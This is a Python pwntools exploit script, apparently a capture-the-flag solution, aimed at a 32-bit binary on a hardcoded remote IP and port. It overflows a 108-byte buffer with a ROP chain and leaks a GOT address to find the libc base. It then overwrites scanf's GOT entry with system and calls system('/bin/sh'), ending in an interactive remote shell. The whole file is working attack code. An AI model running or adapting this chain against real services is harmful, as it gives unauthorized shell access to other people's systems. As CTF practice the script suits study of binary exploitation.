from string import whitespace
from pwn import *
from pwnlib.util.proc import wait_for_debugger
from pwnlib.util.packing import pack

# if hasattr(p, 'pid'):
#     # log.progress(open('/proc/{}/maps'.format(p.pid), 'r').read())
#     pass
# # wait_for_debugger(p.pid)


def main():
    # p = process(['./main'], env={})
    p = remote('54.225.38.91', 1028)
    elf = ELF('./main')
    # libc_elf = ELF('/lib/i386-linux-gnu/libc-2.27.so')
    libc_elf = ELF('../libc6_2.30-0ubuntu2_i386.so')

    context(arch='i386', os='linux', log_level='info')

    if hasattr(p, 'pid'):
        log.progress(open('/proc/{}/maps'.format(p.pid), 'r').read())

    string_addr = elf.symbols['got.__isoc99_scanf'] + 0x10

    rop = ROP(elf)
    rop.puts(elf.symbols['got.__isoc99_scanf'])
    rop.call('__isoc99_scanf', arguments=(0x0804a008, string_addr))  # We write /bin/sh here.
    rop.call('__isoc99_scanf', arguments=(0x0804a008, elf.symbols['got.__isoc99_scanf']))  # Override this with system.
    rop.call('__isoc99_scanf', arguments=(string_addr, ))  # Call system with bin sh.
    log.info(rop.dump())
    data = rop.chain()

    nop = '080491ac'.decode('hex')[::-1]  # 0x08491ac is simply `ret`.
    data = nop * ((108 - len(data)) // len(nop)) + data

    data += 'b' * 100
    data = data[:108]

    log.info(repr(p.recvuntil('\n\n')))
    p.writeline(data)
    addr = int(p.recvline()[:4][::-1].encode('hex'), 16)
    log.progress(hex(addr))
    libc_elf.address = addr - (libc_elf.symbols['__isoc99_scanf'] - libc_elf.address)
    log.progress(hex(libc_elf.address))
    log.progress(hex(string_addr))
    log.progress(hex(elf.symbols['got.__isoc99_scanf']))
    # wait_for_debugger(p.pid)
    p.writeline('/bin/sh')
    p.writeline(p32(libc_elf.symbols['system']))
    p.interactive()
    return


if __name__ == '__main__':
    main()
